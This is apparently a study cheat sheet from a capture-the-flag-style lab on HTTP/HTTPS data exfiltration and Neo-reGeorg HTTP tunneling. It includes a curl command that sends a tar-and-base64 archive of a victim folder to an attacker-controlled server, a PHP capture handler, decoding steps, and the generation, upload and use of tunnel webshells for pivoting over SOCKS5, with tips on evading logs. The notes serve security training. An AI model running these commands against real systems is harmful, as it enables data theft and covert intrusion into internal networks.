
Here is a **clean, structured, Obsidian‑ready note** for **HTTP/HTTPS Data Exfiltration + HTTP Tunneling** based on your lecture.  
It is formatted for fast revision, contains explanations + commands, and is easy to search.

---

# **HTTP/HTTPS Data Exfiltration & HTTP Tunneling — Cheat Sheet**

## **Table of Contents**

- [[#HTTP POST Exfiltration Overview]]
    
- [[#Why POST Instead of GET]]
    
- [[#Inspecting Logs (GET vs POST)]]
    
- [[#Full Exfiltration Workflow (HTTP)]]
    
- [[#Fixing Corrupted Base64]]
    
- [[#Restoring the Exfiltrated Data]]
    
- [[#HTTPS Exfiltration]]
    
- [[#HTTP Tunneling Overview]]
    
- [[#Neo-reGeorg Tunnel Setup Steps]]
    
- [[#Accessing Internal Machines via the Tunnel]]
    

---

# **HTTP POST Exfiltration Overview**

HTTP/HTTPS is commonly used for exfiltration because the traffic looks normal and is difficult to detect.

### **Requirements**

- Attacker controls a web server.
    
- Server must support a server-side language (PHP, Python, NodeJS, etc.).
    
- POST request handler must exist.
    

---

# **Why POST Instead of GET**

|GET|POST|
|---|---|
|Parameters stored in logs|Parameters NOT shown in logs|
|Can be cached|Never cached|
|Appears in browser history|Does NOT appear in history|
|URL length limit|No data length limit|

POST is preferred for exfiltration because it hides the data from logs.

---

# **Inspecting Logs (GET vs POST)**

Example log entries:

```
10.10.198.13 "GET /example.php?file=dGhtOnRyeWhhY2ttZQo=" 200
10.10.198.13 "POST /example.php" 200
```

- GET shows the base64 data in full.
    
- POST shows nothing about the transmitted data.
    

---

# **Full Exfiltration Workflow (HTTP)**

### **1. Attacker prepares a PHP handler**

Stored in **/tmp/http.bs64**:

```php
<?php 
if (isset($_POST['file'])) {
    $file = fopen("/tmp/http.bs64","w");
    fwrite($file, $_POST['file']);
    fclose($file);
}
?>
```

---

### **2. Victim machine compresses + encodes the target folder**

Target: `/home/thm/task6`

### **3. Victim sends POST request (data exfiltration)**

```
curl --data "file=$(tar zcf - task6 | base64)" \
http://web.thm.com/contact.php
```

Breakdown:

- `tar zcf - task6` → compress folder
    
- `| base64` → encode
    
- `curl --data` → send POST parameter `file=...`
    

---

### **4. Attacker retrieves the stored base64 file**

```
ssh thm@web.thm.com
cat /tmp/http.bs64
```

---

# **Fixing Corrupted Base64**

Spaces replace `+` during POST encoding → must repair:

```
sudo sed -i 's/ /+/g' /tmp/http.bs64
```

---

# **Restoring the Exfiltrated Data**

```
cat /tmp/http.bs64 | base64 -d | tar xvfz -
```

Restores the folder exactly as it was.

---

# **HTTPS Exfiltration**

- Same workflow as HTTP.
    
- All data is encrypted on the wire.
    
- Wireshark will show encrypted blobs (cannot see POST body).
    
- Useful for stealthy exfiltration.
    

---

# **HTTP Tunneling Overview**

HTTP Tunneling = encapsulating TCP traffic (like SOCKS proxy) inside HTTP requests.

Used when:

- Internal machines are **not directly reachable**.
    
- You exploit a public webserver to pivot into an internal network.
    

**Tool used:** Neo-reGeorg (updated reGeorg)

---

# **Neo-reGeorg Tunnel Setup Steps**

### **1. Generate encrypted tunnel clients**

```
python3 neoreg.py generate -k thm
```

Outputs:

- tunnel.php
    
- tunnel.jsp
    
- tunnel.aspx
    
- etc.
    

---

### **2. Upload tunnel.php to victim webserver**

Access uploader:

```
http://10.67.180.45/uploader
```

Use key: **admin**  
Upload **tunnel.php**

Tunnel becomes accessible at:

```
http://10.67.180.45/uploader/files/tunnel.php
```

---

### **3. Start the tunnel from AttackBox**

```
python3 neoreg.py -k thm -u http://10.67.180.45/uploader/files/tunnel.php
```

This opens a local proxy:

```
SOCKS5 @ 127.0.0.1:1080
```

---

# **Accessing Internal Machines via the Tunnel**

### **Example: Access app.thm.com (172.20.0.121:80)**

```
curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```

Output:

```
Welcome to APP Server!
```

You can also use:

- ProxyChains
    
- Browser via FoxyProxy
    
- Any tool supporting SOCKS5
    

---

